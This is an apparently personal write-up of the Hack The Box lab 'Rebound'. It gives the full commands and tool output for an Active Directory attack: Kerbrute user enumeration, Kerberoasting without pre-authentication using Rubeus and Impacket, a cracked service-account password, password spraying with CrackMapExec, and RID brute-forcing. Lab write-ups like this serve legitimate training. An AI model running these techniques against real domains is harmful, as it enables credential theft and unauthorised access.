+</p><p id="51740a41-6215-4287-a237-42499777d3aa" class="">jjones hash</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="dafdbe83-314c-4298-9252-cef12ed12483" class="code"><code class="language-PowerShell">$krb5asrep$23$jjones@REBOUND.HTB:8d65e4c40ddb86505865dafb1fe29bef$124c22229476fac3f8fa2ede80d5df111a53e6e14a5706a5c3c3dbf17afaa71b86831a7ecdf6c00366e196090a57d6e8bb6f046b59f7214852a13d1cbf88e8227477b3fc25d5d4a91ff180f779fb65ce3f91c89dd9316d8167a57a0b0df39f91625e62fa9823546de6ecd00f478ba270d3f9d874473210ac23420f44d82cae14c02c8caba801cb0d12733171d48602c0a1dcb2bef0927128ecf2c3e85a3a7c0abbfafa61b6f0a13f936d537e5ca69c2c13760fcce29f23c879e322db9a049cacf436f8599f84aa88a1fe6a32220478162e8c356173c313b75c982216dba88634e2316a02bcf74f56c616</code></pre><p id="c0ddb9e9-b9b9-4818-9c6b-7d18196df086" class="">
+</p><p id="dcdead7e-3af6-4cf1-87dc-925d2445c5e5" class="">To try:</p><p id="1d590c4f-01e4-4e17-8b07-c23bd0b194aa" class=""><code>ldapsearch -x -H ldap://[domain_controller] -D &quot;[username]@[domain]&quot; -w [password] -b &quot;dc=[domain],dc=[com]&quot; servicePrincipalName</code></p><p id="3d0a83cb-5cfd-404d-8c79-ea65074b56d0" class="">
+</p><p id="e25ef0b7-d9cd-486d-bc65-5508362d4ca0" class="">
+</p><p id="d61b7b0f-6bea-41c9-aeae-b584016ff5e7" class="">Kerbrute for user enum:</p><p id="07ae4000-1cbc-46a0-b37c-87504d6882f2" class=""><code>kerbrute userenum --dc 10.129.189.166 -d rebound.htb usr/share/SecLists/Usernames/Names/names.txt</code></p><p id="f8c6a4c1-23f5-499b-b2a7-30b42f02f1b3" class="">
+</p><p id="164bce4f-3219-4312-9950-ce27946b0cab" class="">Using Rubeus.exe</p><p id="1f9eae85-db25-44fc-be25-44ef2cf040c3" class=""><code>Rubeus.exe kerberoast /nopreauth:jjones /domain:rebound.htb /dc:dc01.rebound.htb /spns:services.txt /nowrap</code></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1de59f22-1f5f-464c-bf1f-a8c08d2ca7c3" class="code"><code class="language-PowerShell">C:\Users\dam\Desktop&gt;Rubeus.exe kerberoast /nopreauth:jjones /domain:rebound.htb /dc:dc01.rebound.htb /spns:services.txt /nowrap
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.2.0
+
+
+[*] Action: Kerberoasting
+
+[*] Using jjones without pre-auth to request service tickets
+
+[*] Target SPN             : cifs/dc01.rebound.htb
+[*] Using domain controller: dc01.rebound.htb (10.129.189.166)
+
+[*] Target SPN             : cifs/fileserver.rebound.htb
+[*] Using domain controller: dc01.rebound.htb (10.129.189.166)
+
+[*] Target SPN             : http/webserver.rebound.htb
+[*] Using domain controller: dc01.rebound.htb (10.129.189.166)
+
+[*] Target SPN             : http/dc01.rebound.htb
+[*] Using domain controller: dc01.rebound.htb (10.129.189.166)
+
+[*] Target SPN             : ldap/dc01.rebound.htb
+[*] Using domain controller: dc01.rebound.htb (10.129.189.166)
+[*] Hash                   : $krb5tgs$18$ldap/dc01.rebound.htb$rebound.htb$*ldap/dc01.rebound.htb*$E8565BCD323BB8135B286F20$7D79FD70B3C1CDD5750B8F67336E78E5668DCA7067C92CBEB9DB3489C38E6F880BAECC0FFAE3E1E38904AB009CD813F6A61365DD0393C4012ACCE4128806D2B6EC9025AD9D091079EB4D0B180949EB7E02E62FDE1A413CEAEA9A89ADAAF58AC16C9E92D3A45BCFE2DBAC5647E71A3F57DC0DCC19064F3E1C7410EE6D1A226171270D54656FD16A780EEB5C6741A7C4D51149E768A89B1679FE902BC83F7D24BEB53BA4BCE8C61DD96B86E7EB72A0B35AAD2BC0654D06239514C6695880AC08B44B277696A8AF595333B7015CF32A07FBA3E11BD6C6E5A6DFAAFAA35514ED972B72D6B0D4114F587F907FCCD5A80D9BC471D37DD786A3E55034578903C8B595070AACAE60F9A85DCAF69FCF3F63F02EF14FA10925D891C94644C2B2707BA4DECB37D446E9FCC7D0D7B121A9D055E9D98C952634A2150868700548C1DA8EF2C23832194CD422A6D443626B7920F6837F9718749BBF633E3DDF72DE48C398DEDBE5FB6790180CB335E3D04B9A08C809D2B679174BBC311BB5E91671CECB80E2FA3C83987E561B6D5E280B76604EE4CFA34169844CAAD53174C5D5107D0A0FE94142CFBE977999C01D2BFDE974304C76D26586507F96A93103F06AE49DBD3FF8DEABEEF1D98FC2482CB1E76E963867C28FCC362C482087552CE067B9AEFC90236C4E3628E3321B3E535E392FBF943BBF3703A94A9F74FC3B2489D966DFBB03BEFD3509394C4BE336F28F48966F8D30DA037C803E61E80978B1C46DD11C73848442E4176AE3F556FD691DCA9B25D28B635259C5C04B91694FE5E3F3215A0A65584DA2D88C139ABAF5053129F5B162EEBD6AB963345781D974AABEEE82D0867E3C8A4679CEC41489A1BFDA3EC872D9BA8CA7614570DE0924A6603F89A9A37238817958715F9FC6D665910611447884AA26E719D6EDE7D8939447EBB01189E6783CDF5E31274A57E0962F85B85FB1BAAA68D842AD7318B516D96626BCD7F45A2F7166F25136C89AED48ECFA762ECF573D7C6942C19FFECA9E704C130803C368A45346DBC635084DAE5F310B33E37142874F692EAE3F918A33C3D8582900A8CA6C3AECDADDA489B72F993177D8A8F8C39045B04022E7B7D371D3E7B2C4C7743638609F70A59F347A380D04015594C71A2FCE7307B0EAB744F441F054598C9C34E1842BB15561B25B447858541F50EB97EDFF06A9F497013C14CCC23440B4F346FE4419BEE86388A35BBF488EBF8C1E5A93276427C88D9C11D1F313F41F256E672FD3CC7D1192B4B5198855360ABCB1F4387D820BDDD8E58D15C6EFDE83177C035E4D79EFACADBE495BC2462310E2C0305C098D08CDB3E8C5B7FB228AB7BE
+
+[*] Target SPN             : ldap/dc01.rebound.htb
+[*] Using domain controller: dc01.rebound.htb (10.129.189.166)
+[*] Hash                   : $krb5tgs$18$ldap/dc01.rebound.htb$rebound.htb$*ldap/dc01.rebound.htb*$C9F57AB108DBFC9D4FD11575$01D58B2644C64693782E346E2BFDA0D5E94E7F98C2462CE8AFA4EB39E261ACA8EF20A8F4A9787A757EE17FF7C3C8654EAEE9B0998F0E7003425574EC64CF9F875445306AD477B239F8F522E7499ED01A546EFE18F9743B7A0F0D7FCB9FDBDC66FABB6A9EC71C2B9E63B2B6E0D945A25C44E247CE432CBDE596C407D185AABE84682C0191B542B4C9CB224875CFF98A2320BFE93EF6F5B429A3F411A7D128FA0C010645D7AC055FC199A6D5B3DC92167B9F5D1F867C41FF8D341FCD7030555437D36A2C4B09531CF91E6E57D2819551960C2FB43D813C17305EE80CE21CDE521B8184346687CE14239464563ECEC333E22535C1B46027C427889A6C700A1A99AF3C42F03BC9B988F1A59FC7707E1D7D3576E0D293FFB31D4E143EBC5753079F587ECE5590ECD07BD83891EA12E8065AFC5ECC8215513B90FAFF94A46D8E7983ADA33D5646ED525A9E656D336B37F458A67DAE34DE04913B39C6711A9CE50E1231C3F504FDF3CE5F426B1FA15D0D5057348815ED028F1B6BBF7E1F72B0CFCAE47DBC51A3DF00EF661BA8E513DAC7D1ED64B195DACE5C1132E711BD891FAE30343977E154763DFF16F25FA3DC52EDEF9457328ACFA730A883B62A6FC109738569A00F15ABF9E7121928F094196A48050D688C963941B985CED5AFA4433B564209422421145FD560A569532EA77273908B2CFEA5BC243168CB51A808FF972A9A9BE1AD58F10D236E2816BCE903E692B221B57B40180789BCA2DAEA8AB94F91D36952ED0386BEC63D391A90413CA50CFBB12F8303EF7AEE21CD9F287C0CF5E52D0D1EEB33E8B7C0FA6F8CEE027515445C5AA31402FF3E8BA9348CA6018925A4556AE32B70A6AE06F152B84CB9347AC20C780219A0447781E58F57C7343F6D5822F73293006EE6AE41FC0894C8508DB54241083A2C6A3DF47B383B1D654195ED5F9E4F3B2D4E78802FC605EF25C375EB612379DF487B09492CFA08A1BD6CD6A42080E70144AA74D6AC56930200235905E2ECB7C554CAD9EDD6CA1EDEE7F3A8709C4F9ED067A98206FB25C0CDA6B226E24B98AFCD688666FD856E2675D252DF695A78178F44A02A235FDFF5B11D67F586B145360D1F8B400633A163D47121E1B7B642879758D77B55E4C425FC98BD327540C91D0403322D5281169EA8B3CDDEB7897BA0539494BF8791865972F0A93B21E060E9EBC8C6C2C4E3A7596C6E468C950A467D8354403539A79D68948EDF89B706E4A5DF14A3161DE09225E2787447E83E22557DAE80A59334E2B7202D6DB8D75BB34DFE3894816B0243F7A2AA9A370E6A219A49326C93B0450D1300E9764116BB4F3FA23FE2BC257A8DE6AC7C
+
+[*] Target SPN             : MSSQLSvc/sqlserver.rebound.htb
+[*] Using domain controller: dc01.rebound.htb (10.129.189.166)
+
+[*] Target SPN             : MSSQLSvc/sql01.rebound.htb:1433
+[*] Using domain controller: dc01.rebound.htb (10.129.189.166)
+
+[*] Target SPN             : TERMSRV/dc01.rebound.htb
+[*] Using domain controller: dc01.rebound.htb (10.129.189.166)
+
+[*] Target SPN             : TERMSRV/rdpserver.rebound.htb
+[*] Using domain controller: dc01.rebound.htb (10.129.189.166)
+
+[*] Target SPN             : DNS/dc01.rebound.htb
+[*] Using domain controller: dc01.rebound.htb (10.129.189.166)
+[*] Hash                   : $krb5tgs$18$DNS/dc01.rebound.htb$rebound.htb$*DNS/dc01.rebound.htb*$A70EE2CC7D563D676F35AAB4$FCDDEA1C4B8E80FCA4058584F8D4EF4EC25E32B007BFE949D28E0E549EB7CD7DEEAC215EFECF24E9C8BA14A6605E0211844F4828BA806A47B06DFB0E4F276392CCED2631A32193D6EC8330A2E1F204EE03753133A1EEA99E6FE7990B8FE81FB35A4059FF624669E07501935A7CB71FE0C83E6D8BC2F153605D507E03B1DD6947557BEA09362D32DDEED8A008E3D04C24CE62CCC19A5CF9FBB7F8BF89D2162C3D82F0B6B72031158A08F8AB11C2A1408A3C7F178726BF6A80ED9144734584D6D7C0EE3FEA8C78C880E1DDE6AE499AA044882FD1D134E4F53B145FC17B307CA99B767C8E50C3A25D075E56D68F786EF10EE0A9B702A99B8002062D50C745990B1D79C1117127D2688A7A30D574BF1189F6ED572BB18C9537D741F8D6335F0EA09D71081610DD618E242CE719DAA77CFD74CF1EC4A0D548E186E3213F19521384902F14F9CD491C55C4BA4FD0913170E77438A21B4F5D5A8FBFDC17684385A51470EFCA293FC5738B37EA8B77E8F9177F21C40A81B33DDA6E4B27F232C94A1D95314366D851A4248204700087F06784C1F877CA55B5756DD0885C54BFC9486BCBEC2D605A4B147C2C5E03D1321248DCADFF043A03B655F549D17D395F48D964860E120A449262B3CFA4711462CE988196C8FBE2EEFD495C3A6859EE5BFAD10E2D0E2A5FA7A8A95A03A8D9A500CDB315C4ACE4A9A464FBC54CE466BA50ED7E8575E85D101B4364A0C13EB7755ED6D64CA79A9D6E0EF22F33BE72EA1A13562BAF463D71436F61848E845D01ACD5B8CD5FD6C925214A7A01FEAD9A416A0DE4FB5995DBF00FC44791441E5D806F93A3F7601D78B780FD79D605DA3C04BD437BC684DDFE32C769E46A775346F2BD415D8487915D817760977132961BE47936B3E60AD965B0E4AB30124C89BD584FB5E613E22C732D2CF60BE70EA4EF8FEE97643F556912CE9DE84F8633EBE8A9DE30FEF0D3BE5C64631AA1D1457C8D7FAD35A54888B129D6889475E6C20E67046AE66DC23C2BB396E39B2A55600FA6D98FCCDD34949D4A77539871D250A71B957705F7271124B2AE72BCE10D0B41AC51A965317EA3203EDF2749F66F8F0E1BBC601D895B5B961E35D13E18042EA8978140470D6EC15EF602CD8C5EEEDE935D9A5C205F5C9E32F4ACB31E64062037893CCA88A545E28B40B33EFDAF6CA2B0E739F8A385F5FAA0B2BB4231BA7C9096DD2A568C1BCB40D87F7E129AA82A48206F4B85968DFA958CB5AC0E1E20B95696703D863F9A4908EEA3B541D1C57C5DC3DA607AD101BFE3A334A90A04726FD46D3AA00CAA452568874169E1614DA8D8F8F99189DE10534DDC782D28D6C746A4BC4D430A
+
+[*] Target SPN             : DNS/dns01.rebound.htb
+[*] Using domain controller: dc01.rebound.htb (10.129.189.166)
+
+[*] Target SPN             : WSMAN/dc01.rebound.htb
+[*] Using domain controller: dc01.rebound.htb (10.129.189.166)
+
+[*] Target SPN             : WSMAN/winrmserver.rebound.htb
+[*] Using domain controller: dc01.rebound.htb (10.129.189.166)
+
+[*] Target SPN             : SMTPSVC/mail.rebound.htb
+[*] Using domain controller: dc01.rebound.htb (10.129.189.166)
+
+[*] Target SPN             : POP/mail.rebound.htb
+[*] Using domain controller: dc01.rebound.htb (10.129.189.166)
+
+[*] Target SPN             : ftp/ftpserver.rebound.htb
+[*] Using domain controller: dc01.rebound.htb (10.129.189.166)
+
+[*] Target SPN             : customservice/app01.rebound.htb
+[*] Using domain controller: dc01.rebound.htb (10.129.189.166)
+
+[*] Target SPN             : winrm/dc01.rebound.htb
+[*] Using domain controller: dc01.rebound.htb (10.129.189.166)
+
+FLARE Sun 09/10/2023 16:56:17.95</code></pre><p id="6bc9ae3b-a79c-4ff5-b1dd-e164a03d66a3" class="">
+</p><p id="e9cfefb9-1565-4057-918a-174e96a7cad7" class="">ldap_monitor hash</p><figure id="65b1dd05-dcf5-4ce6-938d-760a4057d56c" class="image"><a href="Rebound%20bc64f28446e44c6fb0bb16eba25737d2/Untitled.png"><img style="width:1650px" src="Rebound%20bc64f28446e44c6fb0bb16eba25737d2/Untitled.png"/></a></figure><p id="5faa6189-8ce3-48f8-b507-5243d98c3944" class="">
+</p><p id="59b9cc7c-eed1-45fc-bc01-08be94b51f58" class="">So for the command:</p><p id="65212f4c-9e20-4a34-8a51-9f2afde5e7db" class=""><code>python3 GetUserSPNs.py -no-preauth &quot;jjones&quot; -usersfile &quot;services.txt&quot; -dc-host 10.129.189.166 rebound.htb/ -request</code></p><p id="bfc5ec1f-1862-4d7e-8a55-2c0cbe25e452" class="">
+</p><p id="e34be119-ea6d-4d59-8015-bcc5afbb9588" class="">Instead of the services I should have used a list of users that have been discovered on the domain</p><p id="ad2f32a7-3c44-47a1-a234-a21e73c2f69f" class=""><br/><br/></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="33b83e13-601f-4de2-b9b8-92de6a48de61" class="code"><code class="language-PowerShell">tbrady
+ldap_monitor
+oorend
+batch_runner
+winrm_svc
+delegator
+ppaul
+llune
+fflock
+DC01$
+ServiceMgmt
+winrm_svc
+ppaul
+llune
+fflock
+jjones
+Administrator
+tbrady
+mmalone
+oorend</code></pre><p id="a2adf1c7-1d8c-4376-87cd-c03efd5b0c05" class="">
+</p><p id="733056ed-19f7-48b5-86ce-8867adde2948" class="">And using the pre-auth option returns the hash for ldap_monitor which is crackable</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="3c72e7eb-bc33-4e90-89d0-9f2ba809c24b" class="code"><code class="language-PowerShell">$krb5tgs$23$*ldap_monitor$REBOUND.HTB$ldap_monitor*$c1bcf91c152fd7e601467a2c81bed2de$a7dd44b8c6511fb6abbd5568be686e299241777937a15c033d4a4581c014e8fa0b01cae44d50b6f51e458405663a88579bd3f08c5fe457ecdc85f9ebe500f721665d4ed72191a1f898d3e0e211aba726e66b24aeabd4a72245acca02f2a02a69518ba7aa708343542b76a8e4258ab5e8e06de3bdf4de0ec030c18d65c58c2b89769606ebf827f04be21979166eef9b432b2b9ee56bc106037a5e15cc298f546ae64e5b23861079f3d01045de9f2de90c27db555ce9b50b049d12bda5d70354aa76ad065b857fd55b00074c1e1ae1f58ad94184d875f26600515d74c9574e516131a26a0049406e661953ce4e3c7c4107f89b97b166ac16727f1ae2d5e46c2786b3b5d4d16fe5ffcee25b168f862037c820fda34c1b2b49ce30a4e4a2a5b9ab46c54974bf523efbaca45cd39d95c711a049d593ee02305a176b8ede86e76032c4479edb6fa8e5a0ad781fc81279a0241b85a46253d21abe5fe1ac0d1e583b651e8081fe2b7cf69ffcbd009c4803469510a6348832c8cf55ea2173c2141a23e9437bbcd931a423e02df9932e84339ccc71712089610c2748543b15aa8c176ab1e149557a2a6430ffd238610257af4097356560a08388fad50d8f5a4b9054d40eaf5a6e5e5d5480414e9cf403770f7adc1155633a3338e85fbdad3382ece064b5763a7983adf210315dfca58cac63af0ab5e705c671fe88701d00896b89602d563ed8bde3dc88644c00533ec049f67fd7fa6206f8b1dd543fd83c92d3c0b52a8875e81edebf1bf353849a422ae652248de249d1190f3f480a237b50070972ff291529c07edd6c7649e4cf5c918208440d80439a80e7f6fd1e83bbac56ef91a7b68f623f69e106c6337cdc9bbcff33b8786c95fd8f9b52837da8397b35096363c41bdfec58247c47436fc8f983b7a0729ddd61aa4125bb12c49dadaf8de3a4f6e8606dd90693dd6d81fb931438af1dde64fde78f95b3b471ba335ffd4ba55c4aac0871cf671d0a77cc20509547d1f3802af81817e1ce34393d3a19bb23a076b6956b7515b6b82222d7fbf66c2d3fad8e083c0fb69c51165c2d9ec96303118869d8ac71a9b3f25ff6e8d2b45f54abe0bf3435f760af25fea71f506f30cc1e688a18965f9d2be4c7caefafe6446a50a5611fe89978dfb1fd093c59f9334dc8d44d3fcd44e83bf467a067704ed96b7cedfa5272eb34bf3ebe095dbedc9407df6d0b5807db241dc3ffca2b7b9d8cd28341472d04af3f6b4a9c6a5ecdeff3bed3568431db8227fb5b0a9372bdf694acea4f55c14ecd7ec128b09e693e8ef41016ddbe26bb8df652c1429dbda52428f99256b60f41e4fdcdfe914f03d61aadb11945e28d653da1:1GR8t@$$4u</code></pre><p id="8ec33693-0138-4072-acd1-18d350e84a76" class="">
+</p><p id="7528ae8a-f71e-422a-a1eb-e9421fd2577e" class="">User credentials</p><p id="3329dc5a-e0d4-45fb-9961-d812c78cfc21" class=""><mark class="highlight-purple">ldap_monitor: 1GR8t@$$4u</mark></p><p id="60372119-bcad-4568-a495-9f59f66691de" class="">
+</p><p id="13622dec-6043-43ae-a54e-bfeb270d0cd4" class="">Trying this to connect to the ldap_monitor service</p><p id="1b626640-3803-4d9a-8039-2b2ce846a604" class=""><code>python3 pyLDAPmonitor.py -d rebound.htb -u ldap_monitor -p &#x27;1GR8t@$$4u&#x27; --use-ldaps --dc-ip 10.129.189.166 -k</code></p><p id="d6919e3c-7a5e-4d8e-a105-5557ced21a4a" class="">
+</p><p id="a4237f8e-da70-445f-b78a-beb53641b990" class="">Trying a password spray since the ldapmonitor git repo did not work</p><p id="e889eb60-d985-46c3-8fc6-ae698df0ab60" class=""><code>kerbrute passwordspray --dc 10.129.189.166 -d rebound.htb users.txt &quot;1GR8t@$$4u”</code></p><p id="7bf630e4-0a98-47ad-83c3-b566fd7aed03" class="">
+</p><p id="83ae201a-d481-4949-a7c0-ffbc3610ee16" class="">Password spraying for another user:</p><p id="58078ec8-113d-4f01-95db-881c4747cc0c" class=""><code>cme smb 10.129.189.166 -u users.txt -p password.txt --continue-on-success</code></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="46ea94be-fae5-4323-8d7d-1c35860fcd83" class="code"><code class="language-PowerShell">┌─[eu-release-1]─[10.10.14.220]─[htb-rooterdam@htb-95cncm9bmq]─[~]
+└──╼ [★]$ cme smb 10.129.189.166 -u users.txt -p password.txt --continue-on-success
+SMB         10.129.189.166  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:False)
+SMB         10.129.189.166  445    DC01             [-] rebound.htb\tbrady:1GR8t@$$4u STATUS_LOGON_FAILURE 
+SMB         10.129.189.166  445    DC01             [-] rebound.htb\tbrady:1GR8t@$$4u STATUS_LOGON_FAILURE 
+SMB         10.129.189.166  445    DC01             [+] rebound.htb\ldap_monitor:1GR8t@$$4u 
+SMB         10.129.189.166  445    DC01             [+] rebound.htb\oorend:1GR8t@$$4u 
+SMB         10.129.189.166  445    DC01             [-] rebound.htb\batch_runner:1GR8t@$$4u STATUS_LOGON_FAILURE 
+SMB         10.129.189.166  445    DC01             [-] rebound.htb\winrm_svc:1GR8t@$$4u STATUS_LOGON_FAILURE 
+SMB         10.129.189.166  445    DC01             [+] rebound.htb\delegator:1GR8t@$$4u 
+SMB         10.129.189.166  445    DC01             [-] rebound.htb\ppaul:1GR8t@$$4u STATUS_LOGON_FAILURE 
+SMB         10.129.189.166  445    DC01             [-] rebound.htb\llune:1GR8t@$$4u STATUS_LOGON_FAILURE 
+SMB         10.129.189.166  445    DC01             [-] rebound.htb\fflock:1GR8t@$$4u STATUS_LOGON_FAILURE 
+SMB         10.129.189.166  445    DC01             [-] rebound.htb\DC01$:1GR8t@$$4u STATUS_LOGON_FAILURE 
+SMB         10.129.189.166  445    DC01             [+] rebound.htb\ServiceMgmt:1GR8t@$$4u 
+SMB         10.129.189.166  445    DC01             [-] rebound.htb\winrm_svc:1GR8t@$$4u STATUS_LOGON_FAILURE 
+SMB         10.129.189.166  445    DC01             [-] rebound.htb\ppaul:1GR8t@$$4u STATUS_LOGON_FAILURE 
+SMB         10.129.189.166  445    DC01             [-] rebound.htb\llune:1GR8t@$$4u STATUS_LOGON_FAILURE 
+SMB         10.129.189.166  445    DC01             [-] rebound.htb\fflock:1GR8t@$$4u STATUS_LOGON_FAILURE 
+SMB         10.129.189.166  445    DC01             [-] rebound.htb\jjones:1GR8t@$$4u STATUS_LOGON_FAILURE 
+SMB         10.129.189.166  445    DC01             [-] rebound.htb\Administrator:1GR8t@$$4u STATUS_LOGON_FAILURE 
+SMB         10.129.189.166  445    DC01             [-] rebound.htb\tbrady:1GR8t@$$4u STATUS_LOGON_FAILURE 
+SMB         10.129.189.166  445    DC01             [-] rebound.htb\mmalone:1GR8t@$$4u STATUS_LOGON_FAILURE 
+SMB         10.129.189.166  445    DC01             [+] rebound.htb\oorend:1GR8t@$$4u</code></pre><p id="f215863f-d1f2-46f7-b4e3-c190237a4986" class="">
+</p><p id="aa880ab0-669b-49a6-9ef1-ea91862bfebb" class="">The user oorend has the same password</p><p id="812f5685-e26f-40b9-928c-c6b385ee4d0b" class="">
+</p><p id="7c60320f-be9d-447b-a4aa-bb0a4bc372f7" class="">Went back to brute force RIDs</p><p id="3eeca994-bbdd-48b6-8542-cfb3f3f85fcb" class=""><code>cme smb 10.129.189.166 -u oorend -p password.txt --rid-brute 10000</code></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="a4784812-f8e5-43aa-9fed-d74ec76f1ed2" class="code"><code class="language-PowerShell">┌─[eu-release-1]─[10.10.14.220]─[htb-rooterdam@htb-95cncm9bmq]─[~]
+└──╼ [★]$ cme smb 10.129.189.166 -u oorend -p password.txt --rid-brute 10000
+SMB         10.129.189.166  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:False)
+SMB         10.129.189.166  445    DC01             [+] rebound.htb\oorend:1GR8t@$$4u 
+SMB         10.129.189.166  445    DC01             [+] Brute forcing RIDs
+SMB         10.129.189.166  445    DC01             498: rebound\Enterprise Read-only Domain Controllers (SidTypeGroup)
+SMB         10.129.189.166  445    DC01             500: rebound\Administrator (SidTypeUser)
+SMB         10.129.189.166  445    DC01             501: rebound\Guest (SidTypeUser)
+SMB         10.129.189.166  445    DC01             502: rebound\krbtgt (SidTypeUser)
+SMB         10.129.189.166  445    DC01             512: rebound\Domain Admins (SidTypeGroup)
+SMB         10.129.189.166  445    DC01             513: rebound\Domain Users (SidTypeGroup)
+SMB         10.129.189.166  445    DC01             514: rebound\Domain Guests (SidTypeGroup)
+SMB         10.129.189.166  445    DC01             515: rebound\Domain Computers (SidTypeGroup)
+SMB         10.129.189.166  445    DC01             516: rebound\Domain Controllers (SidTypeGroup)
+SMB         10.129.189.166  445    DC01             517: rebound\Cert Publishers (SidTypeAlias)
+SMB         10.129.189.166  445    DC01             518: rebound\Schema Admins (SidTypeGroup)
+SMB         10.129.189.166  445    DC01             519: rebound\Enterprise Admins (SidTypeGroup)
+SMB         10.129.189.166  445    DC01             520: rebound\Group Policy Creator Owners (SidTypeGroup)
+SMB         10.129.189.166  445    DC01             521: rebound\Read-only Domain Controllers (SidTypeGroup)
+SMB         10.129.189.166  445    DC01             522: rebound\Cloneable Domain Controllers (SidTypeGroup)
+SMB         10.129.189.166  445    DC01             525: rebound\Protected Users (SidTypeGroup)
+SMB         10.129.189.166  445    DC01             526: rebound\Key Admins (SidTypeGroup)
+SMB         10.129.189.166  445    DC01             527: rebound\Enterprise Key Admins (SidTypeGroup)
+SMB         10.129.189.166  445    DC01             553: rebound\RAS and IAS Servers (SidTypeAlias)
+SMB         10.129.189.166  445    DC01             571: rebound\Allowed RODC Password Replication Group (SidTypeAlias)
+SMB         10.129.189.166  445    DC01             572: rebound\Denied RODC Password Replication Group (SidTypeAlias)
+SMB         10.129.189.166  445    DC01             1000: rebound\DC01$ (SidTypeUser)
+SMB         10.129.189.166  445    DC01             1101: rebound\DnsAdmins (SidTypeAlias)
+SMB         10.129.189.166  445    DC01             1102: rebound\DnsUpdateProxy (SidTypeGroup)
+SMB         10.129.189.166  445    DC01             1951: rebound\ppaul (SidTypeUser)
+SMB         10.129.189.166  445    DC01             2952: rebound\llune (SidTypeUser)
+SMB         10.129.189.166  445    DC01             3382: rebound\fflock (SidTypeUser)
+SMB         10.129.189.166  445    DC01             5277: rebound\jjones (SidTypeUser)
+SMB         10.129.189.166  445    DC01             5569: rebound\mmalone (SidTypeUser)
+SMB         10.129.189.166  445    DC01             5680: rebound\nnoon (SidTypeUser)
+SMB         10.129.189.166  445    DC01             7681: rebound\ldap_monitor (SidTypeUser)
+SMB         10.129.189.166  445    DC01             7682: rebound\oorend (SidTypeUser)
+SMB         10.129.189.166  445    DC01             7683: rebound\ServiceMgmt (SidTypeGroup)
+SMB         10.129.189.166  445    DC01             7684: rebound\winrm_svc (SidTypeUser)
